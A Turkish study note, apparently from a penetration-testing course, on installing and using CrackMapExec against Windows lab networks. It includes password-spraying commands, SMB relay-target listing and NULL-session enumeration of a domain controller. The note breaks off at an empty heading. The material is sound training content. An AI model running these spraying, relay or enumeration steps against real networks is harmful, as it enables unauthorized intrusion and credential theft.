---
{"dg-publish":true,"permalink":"/active-directory-expert/using-crack-map-exec/"}
---


### What is CrackMapExec?

CrackMapExec (diğer adıyla CME), Windows workstation ve sunucularından oluşan büyük ağların güvenliğini değerlendirmeye yardımcı olan bir araçtır.

![Pasted image 20250215115520.png](/img/user/resimler/Pasted%20image%2020250215115520.png)

CME, ağ protokolleriyle çalışmak ve çeşitli exploit sonrası teknikleri gerçekleştirmek için yoğun olarak Impacket kütüphanesini kullanır. CME'nin gücünü anlamak için basit senaryolar hayal etmemiz gerekir:

1. 1.000'den fazla **Windows workstation** ve **server** üzerinde bir **internal security assessment** yürütüyoruz. Sahip olduğumuz **single set of credentials** ile herhangi bir makinede **local administrator** erişimimiz olup olmadığını nasıl test ederiz?
2. Elimizde yalnızca bir **target** ve birden fazla **set of credentials** var, ancak bunların hâlâ geçerli olup olmadığını öğrenmemiz gerekiyor. Bunları hızlıca nasıl test edebiliriz?
3. **Local administrator credentials** elde ettik ve her ele geçirilmiş **workstation** üzerindeki **SAM file**'ı hızlıca **dump** etmek istiyoruz. Bunun için başka bir **tool** mü kullanmalıyız, yoksa her **workstation** üzerinde manuel olarak mı işlem yapmalıyız?


Bu sorular birçok **tool** ve teknik kullanılarak cevaplanabilir, ancak farklı yazarlar tarafından geliştirilen birden fazla **tool** ile çalışmak faydalı olabilir. İşte burada [**CrackMapExec (CME)**](https://github.com/Porchetta-Industries/CrackMapExec) devreye girer ve **internal penetration test** sırasında ihtiyacımız olan küçük işlemleri **automate** etmemize yardımcı olur. **CME**, ayrıca **security assessment** sırasında bulduğumuz **credentials**'ları bir **database** içinde toplar, böylece gerektiğinde bunlara geri dönebiliriz. **Output**, **intuitive** ve **straightforward** olup **tool**, **Linux** ve **Windows** üzerinde çalışır, ayrıca **socks proxy** ve birden fazla **protocol** desteğine sahiptir.

Asıl olarak **offensive purposes** (örn. **internal pentesting**) için kullanılmak üzere tasarlanmış olsa da, **CME**; **blue team** tarafından **account privileges**'ı değerlendirmek, olası **misconfigurations**'ları bulmak ve **attack scenarios**'larını simüle etmek için de kullanılabilir.

Haziran 2021'den beri **CrackMapExec**, yalnızca **[Porchetta](https://porchetta.industries/) platformu** üzerinde güncellenmekte ve **public repository** üzerinde güncellenmemektedir. **Sponsorship**, **[Porchetta](https://porchetta.industries/)** üzerindeki tüm araçlara **altı (6) ay** boyunca erişim sağlamak için **$60** tutarındadır. **Private repository**, her **altı (6) ayda bir** **public repository** ile birleştirilir. Ancak, **community contributions**, herkese anında sunulmaktadır. **CrackMapExec**, [**@byt3bl33d3r**](https://twitter.com/byt3bl33d3r) ve [**@mpgn**](https://twitter.com/mpgn_x64) tarafından geliştirilmektedir. **Official documentation**, [**CrackMapExec Wiki**](https://wiki.porchetta.industries/) üzerinde bulunabilir.

Haziran 2023'te, **mpgn**, **CrackMapExec**'in **lead developer**'ı olarak, **CrackMapExec**'in en son sürümü olan **versiyon 6**'yı içeren yeni bir **repository** oluşturdu, ancak daha sonra bu **repository** kaldırıldı.

Bu araca katkıda bulunan bazı geliştiriciler, projeyi devam ettirmek için bir **fork** oluşturmaya karar verdi. Proje, **NetExec** olarak yeniden adlandırıldı ve şu adreste bulunmaktadır:  
🔗 **[https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)**

**Not:** Bu modülde **CrackMapExec 5.4** sürümünü kullanıyor olsak da, en son güncellemelerle çalışmak için bu yeni **repository**'yi kullanabiliriz:  
🔗 **[https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)**

Şimdi, **CME** aracına genel bir bakış sunduğumuza göre, detaylara girmeden önce onu tercih ettiğimiz **penetration testing system** üzerinde nasıl kuracağımızı ele alalım.



## Installation & Binaries

**CrackMapExec**, **Linux**, **Windows** ve **macOS** ile uyumludur ve ayrıca **Docker** kullanılarak da kurulabilir. Kurulum gerektirmeyen bağımsız **binary** dosyaları da mevcuttur.

Şimdi, **CrackMapExec**'i nasıl kurabileceğimizi inceleyelim.



### Linux Installation

**CrackMapExec** geliştiricileri, bağımlılık ve paket yönetimi için **[Poetry](https://python-poetry.org/docs/)** kullanmayı önermektedir. **Poetry**, **Python** projelerinde bağımlılık yönetimi ve paketleme için kullanılan bir araçtır. Projenizin ihtiyaç duyduğu **kütüphaneleri** tanımlamanıza olanak tanır ve bunları **yükleyip/güncelleyerek** yönetir.

Şimdi, **Poetry**'yi kurmak için [resmi kurulum kılavuzunu](https://python-poetry.org/docs/#installing-with-the-official-installer) takip edelim:


#### Installing Poetry

```
curl -SSL https://install.python-poetry.org | python3 -

Retrieving Poetry metadata
# Welcome to Poetry!
This will download and install the latest version of Poetry,
a dependency and package manager for Python.
It will add the `poetry` command to Poetry's bin directory, located at:
/home/htb-ac35990/.local/bin
You can uninstall at any time by executing this script with the --
uninstall option, and these changes will be reverted.
Installing Poetry (1.2.2): Done
Poetry (1.2.2) is installed now. Great!
You can test that everything is set up by executing the following:
`poetry --version`

```

Sonraki adımda, gerekli **kütüphaneleri** yüklememiz ve **CrackMapExec** deposunu **klonlamamız** gerekiyor. Ayrıca, **RDP protokolü** desteği için artık gerekli olan **Rust**'ı da yüklememiz gerekecek.


#### Installing CrackMapExec Required Libraries

```
sudo apt-get update

sudo apt-get install -y libssl-dev libkrb5-dev libffi-dev python-dev build-essential

<SNIP>

```

CrackMapExec, RDP protokolü için Rust kullanan bir kütüphaneye ihtiyaç duyar. Rust'ı kurmak için şu komutu kullanacağız. Eğer bir uyarı alırsak, `y` yazmamız ve `1.` seçeneği seçmemiz gerekir:


#### Installing Rust

```
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs/ | sh

info: downloading installer
warning: it looks like you have an existing installation of Rust at:
warning: /usr/bin
warning: rustup should not be installed alongside Rust. Please uninstall
your existing Rust first.
warning: Otherwise you may have confusion unless you are careful with your
PATH
warning: If you are sure that you want both rustup and your already
installed Rust
warning: then please reply `y' or `yes' or set RUSTUP_INIT_SKIP_PATH_CHECK
to yes
warning: or pass `-y' to ignore all ignorable checks.
error: cannot install while Rust is installed

Continue? (y/N) y

<SNIP>
Current installation options:
 default host triple: x86_64-unknown-linux-gnu
 default toolchain: stable (default)
 profile: default
 modify PATH variable: yes
1) Proceed with installation (default)
2) Customize installation
3) Cancel installation
>1
<SNIP>

```

Sonraki adımda, terminali kapatmalıyız; aksi takdirde RDP kütüphanesi aardwolf'u kurarken bir hata alırız. Terminali kapattıktan sonra, yeni bir terminal açıp kuruluma devam etmeliyiz.


#### Installing CrackMapExec with Poetry

```
git clone https://github.com/Porchetta-Industries/CrackMapExec
cd CrackMapExec
poetry install

poetry install

Installing dependencies from lock file
Package operations: 94 installs, 0 updates, 0 removals
 • Installing asn1crypto (1.5.1)
 • Installing asysocks (0.2.1)
 • Installing oscrypto (1.3.0)
<SNIP>

```


Şimdi, yeni kurduğumuz CrackMapExec aracını aşağıdaki komutla test edebiliriz:

```
poetry run crackmapexec .
```


#### Running CrackMapExec with Poetry

```
poetry run crackmapexec
poetry run crackmapexec
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter
INTERVAL] [--darrell] [--verbose] {ftp,ssh,winrm,mssql,rdp,ldap,smb} ...
 ______ .______ ___ ______ __ ___ .___ ___.
___ .______ _______ ___ ___ _______ ______
 / || _ \ / \ / || |/ / | \/ | /
\ | _ \ | ____|\ \ / / | ____| / |
 | ,----'| |_) | / ^ \ | ,----'| ' / | \ / | /
^ \ | |_) | | |__ \ V / | |__ | ,----'
 | | | / / /_\ \ | | | < | |\/| | /
/_\ \ | ___/ | __| > < | __| | |
 | `----.| |\ \----. / _____ \ | `----.| . \ | | | | /
_____ \ | | | |____ / . \ | |____ | `----.
 \______|| _| `._____|/__/ \__\ \______||__|\__\ |__| |__| /__/
\__\ | _| |_______|/__/ \__\ |_______| \______|
 A swiss army knife for
pentesting networks
 Forged by @byt3bl33d3r and @mpgn_x64
using the powah of dank memes
 Exclusive release for Porchetta
Industries users

https://porchetta.industries/
 Version : 5.4.0
 Codename:
Indestructible G0thm0g
optional arguments:
 -h, --help show this help message and exit
 -t THREADS set how many concurrent threads to use (default:
100)
 --timeout TIMEOUT max timeout in seconds of each thread (default:
None)
 --jitter INTERVAL sets a random delay between each connection
(default: None)
 --Darrell give Darrell a hand
 --verbose enable verbose output
protocols:
 available protocols
 {ftp,ssh,winrm,mssql,rdp,LDAP,smb}
 ftp own stuff using FTP
 ssh own stuff using SSH
 winrm own stuff using WINRM
 mssql own stuff using MSSQL
 rdp own stuff using RDP
 ldap own stuff using LDAP
 smb own stuff using SMB
```


Not: CrackMapExec repository'si güncellenirse ve indirdiğimiz kopyayı Git clone ile güncellemek istersek, CrackMapExec dizinine gidip online repository'den en son değişiklikleri indirmek için `git pull` komutunu kullanabiliriz. Eğer `poetry run` komutunu kullanmadan önce crackmapexec'i çalıştırmak istiyorsak, Poetry virtual environment'ını etkinleştirmek için kurulum dizininde `poetry shell` komutunu çalıştırabiliriz.


### Using Poetry Shell

```
cd CrackMapExec
poetry shell

Spawning shell within /home/htbXXXXXXX/.cache/pypoetry/virtualenvs/crackmapexec-4YDbTJlJ-py3.9

(crackmapexec-py3.9) crackmapexec --help
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter
INTERVAL] [--darrell] [--verbose] {ftp,ldap,mssql,rdp,smb,ssh,winrm} ...
<SNIP>

```

Not: Poetry shell'de olduğumuzu, terminalimizin başında (`crackmapexec-py3.X`) gördüğümüzde anlayabiliriz. Virtual environment'ı devre dışı bırakmak ve bu yeni shell'den çıkmak için `exit` yazabiliriz. Virtual environment'ı shell'den çıkmadan devre dışı bırakmak için ise `deactivate` komutunu kullanabiliriz.


## Installation for Docker

CrackMapExec, Docker uyumlu bir araçtır. GitHub repository'sindeki Dockerfile'ı kullanarak kaynaktan derleyebiliriz.


### Installing Docker using the GitHub repository

```
sudo apt install docker.io
git clone https://github.com/Porchetta-Industries/CrackMapExec -q
cd CrackMapExec
sudo docker build -t crackmapexec .
sudo docker build -t crackmapexec .

Sending build context to Docker daemon 10.38MB
<SNIP>
```


```
sudo docker run -it --entrypoint=/bin/bash --name crackmapexec -v ~/.cme:/root/.cme crackmapexec
root@d46e1e7925dc:/usr/src/crackmapexec/cme# crackmapexec

[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing RDP protocol database
[*] Initializing SMB protocol database
[*] Initializing SSH protocol database
[*] Initializing WINRM protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter
INTERVAL] [--darrell] [--verbose] {ftp,ssh,winrm,mssql,rdp,LDAP,smb} ...
 ______ .______ ___ ______ __ ___ .___ ___.
___ .______ _______ ___ ___ _______ ______
 / || _ \ / \ / || |/ / | \/ | /
\ | _ \ | ____|\ \ / / | ____| / |
 | ,----'| |_) | / ^ \ | ,----'| ' / | \ / | /
^ \ | |_) | | |__ \ V / | |__ | ,----'
 | | | / / /_\ \ | | | < | |\/| | /
/_\ \ | ___/ | __| > < | __| | |
 | `----.| |\ \----. / _____ \ | `----.| . \ | | | | /
_____ \ | | | |____ / . \ | |____ | `----.
 \______|| _| `._____|/__/ \__\ \______||__|\__\ |__| |__| /__/
\__\ | _| |_______|/__/ \__\ |_______| \______|
 A swiss army knife for
pentesting networks
 Forged by @byt3bl33d3r and @mpgn_x64
using the powah of dank memes
 Exclusive release for Porchetta
Industries users

https://porchetta.industries/
 Version : 5.4.0
 Codename:
Indestructible G0thm0g
<SNIP>

```


Container'dan çıktıktan sonra, aşağıdaki komutla yeniden başlatabiliriz:

### Restart Container

```
sudo docker start crackmapexec
sudo docker exec -it crackmapexec bash
root@dbbda0e6bf72:/usr/src/crackmapexec#
```

Not: Docker repository'si ve yayınlanan binary'ler güncel olmayabilir. Kaynaktan derleme yapmak, en son mevcut sürümü kullandığımızı garanti eder.


### Using Binaries

CrackMapExec'i, önceden derlenmiş ve CrackMapExec GitHub repository'sinde [releases](https://github.com/byt3bl33d3r/CrackMapExec/releases) altında mevcut olan binary'lerle de kullanabiliriz. 

Repository'de iki ana dosya bulacağız: biri cme ile başlayanlar, diğeri ise cmedb ile başlayanlar. cme, CrackMapExec uygulamasına karşılık gelirken, cmedb, CrackMapExec veritabanıyla etkileşimde bulunmamızı sağlayan binary'ye karşılık gelir.  
Bir binary kullanmak istiyorsak, bunu releases bölümünden indirmemiz ve Python'un yüklü olması gerekir. Eğer Windows üzerinde çalışıyorsak ve Python yüklü değilse, [burada](https://www.python.org/downloads/windows/) mevcut olan Python Windows embeddable paketini indirebiliriz, ardından aşağıdaki komutu çalıştırabiliriz:


### Compiled Binaries Windows

```
C:\htb> python.exe cme
<SNIP>
```


Not: Binary'ler Windows, Linux ve MacOS üzerinde de kullanılabilir.  

Windows'ta, yol uzunluğu ile ilgili hatalardan kaçınmak için aşağıdaki Registry key'ini ekleyin:


### Setting Long Path Registry Key

```
C:\> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem" /v LongPathsEnabled /t REG_DWORD /d 1 /f
```

Not: CrackMapExec loglarını ve database'ini `~/.cme` dizinine kaydeder.

Aşağıdaki bölümlerde, CrackMapExec işlevlerini kullanarak Windows ortamlarını enumere edecek ve saldırıya geçeceğiz.


## Targets and Protocols

### Targets Format

Scope'a bağlı olarak, bir engagement sırasında belirli bir aralıktaki bir veya daha fazla hedefi veya önceden tanımlanmış host adlarını tarayabiliriz. CrackMapExec bunu mükemmel bir şekilde yönetebilir. Hedef, bir [CIDR](https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing), bir IP, bir host adı veya IP adreslerini/host adlarını içeren bir dosya adı olabilir.

```
crackmapexec [protocol] 10.10.10.1
crackmapexec [protocol] 10.10.10.1 10.10.10.2 10.10.10.3
crackmapexec [protocol] 10.10.10.1/24
crackmapexec [protocol] internal.local
crackmapexec [protocol] targets.txt
```


### Supported Protocols

CrackMapExec, bir internal security değerlendirmesi sırasında bize yardımcı olmak için tasarlanmıştır. Bu nedenle, Windows ile bağlantılı birden fazla protokolü desteklemesi gerekir. Bu modül yazıldığı sırada, CrackMapExec yedi protokolü desteklemektedir:

| Protocol | Default Port |
| -------- | ------------ |
| SMB      | 445          |
| WINRM    | 5985/5986    |
| MSSQL    | 1433         |
| LDAP     | 389          |
| SSH      | 22           |
| RDP      | 3389         |
| FTP      | 21           |

Mevcut protokolleri doğrulamak için, mevcut seçenekleri ve protokolleri listelemek için `crackmapexec --help` komutunu çalıştırabiliriz.


### Genel Seçenekleri ve Protokolleri Listele

```
crackmapexec --help

usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter
INTERVAL] [--darrell] [--verbose] {ftp,ssh,winrm,mssql,rdp,ldap,smb} ...
 ______ .______ ___ ______ __ ___ .___ ___.
___ .______ _______ ___ ___ _______ ______
 / || _ \ / \ / || |/ / | \/ | /
\ | _ \ | ____|\ \ / / | ____| / |
 | ,----'| |_) | / ^ \ | ,----'| ' / | \ / | /
^ \ | |_) | | |__ \ V / | |__ | ,----'
 | | | / / /_\ \ | | | < | |\/| | /
/_\ \ | ___/ | __| > < | __| | |
 | `----.| |\ \----. / _____ \ | `----.| . \ | | | | /
_____ \ | | | |____ / . \ | |____ | `----.
 \______|| _| `._____|/__/ \__\ \______||__|\__\ |__| |__| /__/
\__\ | _| |_______|/__/ \__\ |_______| \______|
 A swiss army knife for
pentesting networks
 Forged by @byt3bl33d3r and @mpgn_x64
using the powah of dank memes
 Exclusive release for Porchetta
Industries users

https://porchetta.industries/
 Version : 5.4.0
 Codename:
Indestructible G0thm0g
optional arguments:
 -h, --help show this help message and exit
 -t THREADS set how many concurrent threads to use (default:
100)
 --timeout TIMEOUT max timeout in seconds of each thread (default:
None)
 --jitter INTERVAL sets a random delay between each connection
(default: None)
 --darrell give Darrell a hand
 --verbose enable verbose output
protocols:
 available protocols
 {ftp,ssh,winrm,mssql,rdp,ldap,smb}
 ftp own stuff using FTP
 ssh own stuff using SSH
 winrm own stuff using WINRM
 mssql own stuff using MSSQL
 rdp own stuff using RDP
 ldap own stuff using LDAP
 smb own stuff using SMB

```


Belirli bir protokolün desteklediği seçenekleri görmek için `crackmapexec <protocol> --help` komutunu çalıştırabiliriz. LDAP'ı örnek olarak görelim:


### LDAP Protokolü ile Kullanılabilen Seçenekleri Görüntülem

```
crackmapexec ldap --help

usage: crackmapexec ldap [-h] [-id CRED_ID [CRED_ID ...]]
 [-u USERNAME [USERNAME ...]]
 [-p PASSWORD [PASSWORD ...]] [-k]
 [--export EXPORT [EXPORT ...]]
 [--aesKey AESKEY [AESKEY ...]] [--kdcHost
KDCHOST]
 [--gfail-limit LIMIT | --ufail-limit LIMIT | --
fail-limit LIMIT]
 [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION
...]]
 [-L] [--options] [--server {http,https}]
 [--server-host HOST] [--server-port PORT]
 [--connectback-host CHOST] [-H HASH [HASH ...]]
 [--no-bruteforce] [--continue-on-success]
 [--port {636,389}] [--no-smb]
 [-d DOMAIN | --local-auth] [--asreproast
ASREPROAST]
 [--kerberoasting KERBEROASTING]
[--trusted-for-delegation] [--password-notrequired]
 [--admin-count] [--users] [--groups]
 [target ...]
positional arguments:
 target the target IP(s), range(s), CIDR(s), hostname(s),
 FQDN(s), file(s) containing a list of targets,
NMap
 XML or .Nessus file(s)
optional arguments:
 -h, --help show this help message and exit
 -id CRED_ID [CRED_ID ...]
 database credential ID(s) to use for
authentication
 -u USERNAME [USERNAME ...]
 username(s) or file(s) containing usernames
 -p PASSWORD [PASSWORD ...]
 password(s) or file(s) containing passwords
 -k, --kerberos Use Kerberos authentication from ccache file
 (KRB5CCNAME)
 --export EXPORT [EXPORT ...]
 Export result into a file, probably buggy
 --aesKey AESKEY [AESKEY ...]
 AES key to use for Kerberos Authentication (128 or
256
 bits)
 --kdcHost KDCHOST FQDN of the domain controller. If omitted it will
use
 the domain part (FQDN) specified in the target
 parameter
 --gfail-limit LIMIT max number of global failed login attempts
 --ufail-limit LIMIT max number of failed login attempts per username
 --fail-limit LIMIT max number of failed login attempts per host
 -M MODULE, --module MODULE
 module to use
 -o MODULE_OPTION [MODULE_OPTION ...]
 module options
 -L, --list-modules list available modules
 --options display module options
 --server {http,https}
 use the selected server (default: https)
 --server-host HOST IP to bind the server to (default: 0.0.0.0)
 --server-port PORT start the server on the specified port
 --connectback-host CHOST
 IP for the remote system to connect back to (default:
 same as server-host)
 -H HASH [HASH ...], --hash HASH [HASH ...]
 NTLM hash(es) or file(s) containing NTLM hashes
 --no-bruteforce No spray when using file for username and password
 (user1 => password1, user2 => password2
 --continue-on-success
 continues authentication attempts even after
successes
 --port {636,389} LDAP port (default: 389)
 --no-smb No smb connection
 -d DOMAIN domain to authenticate to
 --local-auth authenticate locally to each target
Retrevie hash on the remote DC:
 Options to get hashes from Kerberos
 --asreproast ASREPROAST
 Get AS_REP response ready to crack with hashcat
 --kerberoasting KERBEROASTING
 Get TGS ticket ready to crack with hashcat
Retrieve useful information on the domain:
 Options to to play with Kerberos
 --trusted-for-delegation
 Get the list of users and computers with flag
TRUSTED_FOR_DELEGATION
 --password-not-required
 Get the list of users with flag PASSWD_NOTREQD
 --admin-count Get objets that had the value adminCount=1
 --users Enumerate enabled domain users
 --groups Enumerate domain groups

```



### Hedef Seçme ve Protokol Kullanma

Desteklenen birkaç protokol ve her biri için çeşitli seçeneklerle, CrackMapExec'te ustalaşmanın zor olacağını düşünebiliriz. Neyse ki, bir protokol için nasıl çalıştığını anladığımızda, aynı mantık diğer protokoller için de geçerlidir. Örneğin, password spraying tüm protokoller için aynıdır:


### Password Spray Example with WinRm

```
crackmapexec winrm 10.10.10.1 -u users.txt -p password.txt --no-bruteforce --continue-on-success
```

Başka bir protokole karşı password spraying saldırısı gerçekleştirmek istiyorsak, protokolü değiştirmemiz gerekir:

- **`--no-bruteforce`**
    
    - Bu parametre, **bruteforce denemelerini** devre dışı bırakır. Eğer bu parametre kullanılırsa, sadece kullanıcı adı ve şifrenin doğru eşleştiği durumlar kontrol edilir. Yani, şifre denemeleri yapmadan doğrudan kullanıcının geçerli olup olmadığı kontrol edilir. Eğer bu parametre kullanılmasaydı, her kullanıcı ve şifre kombinasyonu denenecekti.

- **`--continue-on-success`**
    
    - Bu parametre, **başarı durumunda işlemi durdurmamayı** sağlar. Eğer doğru bir kullanıcı adı ve şifre kombinasyonu bulunursa, işlem durmaz ve diğer kullanıcılar ve şifreler için de denemelere devam edilir. Bu, hedefte daha fazla kullanıcı hesabı veya farklı şifreler denemek için kullanılır.

### Target Protocols

```
crackmapexec smb 10.10.10.1 [protocol options]
crackmapexec mssql 10.10.10.1 [protocol options]
crackmapexec ldap 10.10.10.1 [protocol options]
crackmapexec ssh 10.10.10.1 [protocol options]
crackmapexec rdp 10.10.10.1 [protocol options]
crackmapexec ftp 10.10.10.1 [protocol options]
```

Bu basit kuralı anladığımızda, CrackMapExec'in gücünün, sunulan tüm seçeneklerle ilgili kullanım kolaylığından kaynaklandığını göreceğiz.


### Export Function

CrackMapExec bir export fonksiyonu ile birlikte gelir, ancak yardım menüsünde gösterildiği gibi hatalıdır. Dışa aktarılacak dosyanın tam yolunu gerektirir:

#### Exporting result CME
 
```
crackmapexec smb 10.10.10.1 [protocol options] --export $(pwd)/export.txt
```

Bir sonraki bölümde, bazı export örneklerini tartışacağız.


### Protocol Modules

CrackMapExec, daha sonra kullanacağımız ve tartışacağımız modülleri destekler. Her protokolün farklı modülleri vardır. Belirtilen protokol için mevcut modülleri görüntülemek için `crackmapexec protocol -L` komutunu çalıştırabiliriz.

**Protokol Tabanlı Listeleme:** Hangi servislerin açık olduğuna dair bilgi verir.


#### LDAP için Mevcut Modülleri Görüntüle

```
crackmapexec ldap -L

[*] MAQ Retrieves the MachineAccountQuota domainlevel attribute
[*] adcs Find PKI Enrollment Services in Active
Directory and Certificate Templates Names
[*] daclread Read and backup the Discretionary Access
Control List of objects. Based on the work of @_nwodtuhs and @BlWasp_. Be
carefull, this module cannot read the DACLS recursively, more explains in
the options.
[*] get-desc-users Get description of the users. May contained
password
[*] get-network
[*] laps Retrieves the LAPS passwords
[*] ldap-checker Checks whether LDAP signing and binding are
required and / or enforced
[*] ldap-signing Check whether LDAP signing is required
[*] subnets Retrieves the different Sites and Subnets of
an Active Directory
[*] user-desc Get user descriptions stored in Active
Directory
[*] whoami Get details of provided user

```



## Basic SMB Reconnaissance

SMB protokolü, bir Windows hedefi üzerinde keşif yapmak için avantajlıdır. Herhangi bir kimlik doğrulaması olmadan, aşağıdaki gibi her türlü bilgiyi alabiliriz:

| IP address                  | Target local name      |
| --------------------------- | ---------------------- |
| Windows version             | Architecture (x86/x64) |
| Fully qualified domain name | SMB signing enabled    |
| SMB version                 |                        |

### SMB Enumeration

```
crackmapexec smb 192.168.133.0/24

SMB 192.168.133.1 445 DESKTOP-DKCQVG2 [*] Windows 10.0 Build
19041 x64 (name:DESKTOP-DKCQVG2) (domain:DESKTOP-DKCQVG2) (signing:False)
(SMBv1:False)

SMB 192.168.133.158 445 WIN-TOE6NQTR989 [*] Windows Server
2016 Datacenter 14393 x64 (name:WIN-TOE6NQTR989)
(domain:inlanefreight.htb) (signing:True) (SMBv1:True)

SMB 192.168.133.157 445 WIN7 [*] Windows 7 Ultimate
7601 Service Pack 1 x64 (name:WIN7) (domain:WIN7) (signing:False)
(SMBv1:True)
```

Bu basit komutla, tarama anında laboratuvarımızdaki tüm canlı hedefleri, domain adı, işletim sistemi sürümü vb. ile birlikte alabiliriz. Çıktıda gördüğümüz gibi, hedef `192.168.133.157`'nin `domain parametresi`, name parametresiyle aynı, yani hedef WIN7, `inlanefreight.htb` domain'ine katılmamış. Buna karşın, `WIN-TOE6NQTR989` hedefi `inlanefreight.htb` domain'ine katılmış.


Ayrıca bir Windows 10, bir Windows Server ve bir Windows 7 host'u da görebiliyoruz. Windows sunucuları genellikle ilginç verilerle dolu zengin hedeflerdir (paylaşımlar, parolalar, web sitesi ve veritabanı yedekleri, vb.) Hepsi Windows'un 64 bit sürümleridir, bu da bunlardan birinde özel bir binary çalıştırmamız gerektiğinde yardımcı olabilir.


### SMB Signing Devre Dışı Olan Tüm Hostları Alma

CrackMapExec, SMB signing'in devre dışı olduğu tüm host'ları çıkartma seçeneğine sahiptir. Bu seçenek, SMBRelay saldırısı gerçekleştirmek için Impacket'ten [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) ile [Responder](https://github.com/lgandx/Responder) kullanmak istediğimizde oldukça kullanışlıdır.

```
crackmapexec smb 192.168.1.0/24 --gen-relay-list

relaylistOutputFilename.txt

SMB 192.168.1.101 445 DC2012A [*] Windows Server
2012 R2 Standard 9600 x64 (name:DC2012A) (domain:OCEAN) (signing:True)
(SMBv1:True)

SMB 192.168.1.102 445 DC2012B [*] Windows Server
2012 R2 Standard 9600 x64 (name:DC2012B) (domain:EARTH) (signing:True)
(SMBv1:True)

SMB 192.168.1.111 445 SERVER1 [*] Windows Server
2016 Standard Evaluation 14393 x64 (name:SERVER1) (domain:PACIFIC)
(signing:False) (SMBv1:True)

SMB 192.168.1.117 445 WIN10DESK1 [*] WIN10DESK1 x64
(name:WIN10DESK1) (domain:OCEAN) (signing:False) (SMBv1:True)
<SNIP>

```

```
cat relaylistOutputFilename.txt
192.168.1.111
192.168.1.117
```

#### Signing Disabled - Host Enumeration

Bu komut, ağınızdaki tüm SMB sunucularını tarar ve SMB imzalama (SMB signing) özelliğini devre dışı bırakmış olan sistemleri belirleyerek bunları bir listeye kaydeder. Yani, sadece SMB imzalama devre dışı bırakılmış olan sunucular bu listeye dahil edilir.

**`--gen-relay-list`** parametresi, SMB Signing kapalı olan makinelerin IP adreslerini çıkaran bir "relay listesi" oluşturur. Bu liste daha sonra **SMBRelay** saldırılarında kullanılabilir. Yani, bu listeyi kullanarak, SMB imzalamayı devre dışı bırakmış makinelerde SMB relay saldırısı yapabilirsiniz.

Bu sayede, "Signing" (SMB signing devre dışı bırakılmış) makineleri hedef alırsınız, çünkü bu makinelerde SMB iletişiminde Signing doğrulaması yapılmaz ve dolayısıyla relay saldırılarına daha açıktırlar.


Bu modülün "Stealing Hashes" bölümünde relaying konusunu ele alacağız.

Ayrıca, bu blog yazısı: [_Practical guide to NTLM Relaying in 2017_](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html) da okunmaya değer.


## Exploiting NULL/Anonymous Sessions

[NULL Session](https://en.wikipedia.org/wiki/Null_session), Windows tabanlı bilgisayarlarda bir inter-process communication (IPC) ağ servisine anonim bir bağlantıdır. Bu servis, named pipe bağlantılarına izin vermek üzere tasarlanmış olsa da, saldırganlar tarafından sistem hakkında uzaktan bilgi toplamak için kullanılabilir. 

Bir hedef, özellikle bir domain controller  `NULL Session'a` karşı savunmasızsa, saldırganın geçerli bir domain hesabına sahip olmadan aşağıdaki gibi bilgileri toplamasına izin verebilir:

* Domain users ( --users )
* Domain groups ( --groups )
* Password policy ( --pass-pol )
* Share folders ( --shares )

 Aşağıdaki komutları kullanarak bir domain controller üzerinde deneyelim:

### Enumerating the Password Policy
 
```
crackmapexec smb 10.129.203.121 -u '' -p '' --pass-pol

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)

SMB 10.129.203.121 445 DC01 [+] Dumping password
info for domain: INLANEFREIGHT

SMB 10.129.203.121 445 DC01 Minimum password
length: 7

SMB 10.129.203.121 445 DC01 Password history
length: 24

SMB 10.129.203.121 445 DC01 Maximum password age:
41 days 23 hours 53 minutes

SMB 10.129.203.121 445 DC01

SMB 10.129.203.121 445 DC01 Password Complexity
Flags: 000001

SMB 10.129.203.121 445 DC01 Domain Refuse
Password Change: 0

SMB 10.129.203.121 445 DC01 Domain Password
Store Cleartext: 0

SMB 10.129.203.121 445 DC01 Domain Password
Lockout Admins: 0

SMB 10.129.203.121 445 DC01 Domain Password No
Clear Change: 0

SMB 10.129.203.121 445 DC01 Domain Password No
Anon Change: 0

SMB 10.129.203.121 445 DC01 Domain Password
Complex: 1

SMB 10.129.203.121 445 DC01

SMB 10.129.203.121 445 DC01 Minimum password age:
1 day 4 minutes

SMB 10.129.203.121 445 DC01 Reset Account Lockout
Counter: 30 minutes

SMB 10.129.203.121 445 DC01 Locked Account
Duration: 30 minutes

SMB 10.129.203.121 445 DC01 Account Lockout
Threshold: None

SMB 10.129.203.121 445 DC01 Forced Log off Time:
Not Set
```

Bu listeyi dışa aktarmak istiyorsak, `--export [OUTPUT_FULL_FILE_PATH]` komutunu kullanabiliriz. Aşağıdaki örnekte, mevcut yolu kullanmak için `$(pwd)` kullanacağız:


### Exporting Password Policy

```
crackmapexec smb 10.129.203.121 -u '' -p '' --pass-pol --export $(pwd)/passpol.txt

...SNIP...
```

Export bir JSON dosyası olacaktır. Dosyayı, tek tırnakları çift tırnaklarla değiştirmek için `sed` komutunu kullanarak formatlayabiliriz ve ardından `jq` uygulamasını kullanarak görüntüleyebiliriz.

### Formating exported file

```
sed -i "s/'/\"/g" passpol.txt
cat passpol.txt | jq
{
 "min_pass_len": 1,
 "pass_hist_len": 24,
 "max_pass_age": "41 days 23 hours 53 minutes ",
 "min_pass_age": "1 day 4 minutes ",
 "pass_prop": "000000",
 "rst_accnt_lock_counter": "30 minutes ",
 "lock_accnt_dur": "30 minutes ",
 "accnt_lock_thres": "None",
 "force_logoff_time": "Not Set"
}
```


### Enumerating Users

```
